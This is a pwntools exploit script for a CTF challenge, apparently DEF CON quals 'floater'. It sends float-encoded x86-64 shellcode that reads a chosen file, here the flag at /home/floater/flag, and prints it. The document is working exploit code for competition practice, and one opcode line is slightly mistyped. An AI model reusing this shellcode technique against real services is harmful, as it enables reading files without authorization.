
from pwn import *

context.update(os='linux', arch='amd64')

r = remote('floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me', 754)

data = '''
  6a 00                   push   0x0
  5f                      pop    rdi
  /* e95f006a = -1.6849526E25 */
   
  8 89 e6                mov    rsi,rsp
  /* e9e68948 = -3.4837654E25 */
   
  6a 7f                   push   0x7f
  5a                      pop    rdx
  /* e95a7f6a = -1.650922E25 */
   
  48 31 c0                xor    rax,rax
  /* e9c03148 = -2.904331E25 */
   
  0f 05                   syscall
  /* e990050f = -2.176365E25 */
   
  48 89 e7                mov    rdi,rsp
  /* e9e78948 = -3.498877E25 */
  
  48 31 f6                xor    rsi,rsi
  /* e9f63148 = -3.720356E25 */
  
  6a 49                   push   0x49
  58                      pop    rax
  /* e958496a = -1.6342167E25 */
  
  6a 04                   push   0x4
  5b                      pop    rbx
  /* e95b046a = -1.6548475E25 */
  
  f7 e3                   mul    ebx
  /* e990e3f7 = -2.1895231E25 */
  
  48 89 c2                mov    rdx,rax
  /* e9c28948 = -2.9397488E25 */
  
  6a 02                   push   0x2
  58                      pop    rax
  /* e958026a = -1.6321211E25 */
  
  0f 05                   syscall
   /* e990050f = -2.176365E25 */

  48 89 c7                mov    rdi,rax
  /* e9c78948 = -3.0153066E25 */
  
  48 89 e6                mov    rsi,rsp
  /* e9e68948 = -3.4837654E25 */
  
  6a 7f                   push   0x7f
  5a                      pop    rdx
  /* e95a7f6a = -1.650922E25 */

  48 31 c0                xor    rax,rax
  /* e9c03148 = -2.904331E25 */

  0f 05                   syscall
   /* e990050f = -2.176365E25 */


  6a 01                   push   0x1
  5f                      pop    rdi
  /* e95f016a = -1.6849821E25 */

  48 89 c2                mov    rdx,rax
  /* e9c28948 = -2.9397488E25 */

  6a 01                   push   0x1
  58                      pop    rax
  /* e958016a = -1.6320916E25 */

  0f 05                   syscall
   /* e990050f = -2.176365E25 */
  
  48 31 ff                xor    rdi, rdi
  /* e9ff3148 = -3.85636E25 */
  
  6a 3c                   push   0x3c
  58                      pop    rax
  /* e9583c6a = -1.633833E25 */
  
  0f 05 syscall
  /* e990050f = -2.176365E25 */
'''

arr = data.split('\n')

floats = [x.split()[-2] for x in arr if '/*' in x]

print(floats)

while len(floats) < 25:
	floats.append('0');

print('\n'.join(floats))

r.sendline('\n'.join(floats))
r.sendline('/home/floater/flag\x00')
r.interactive()
r.close()

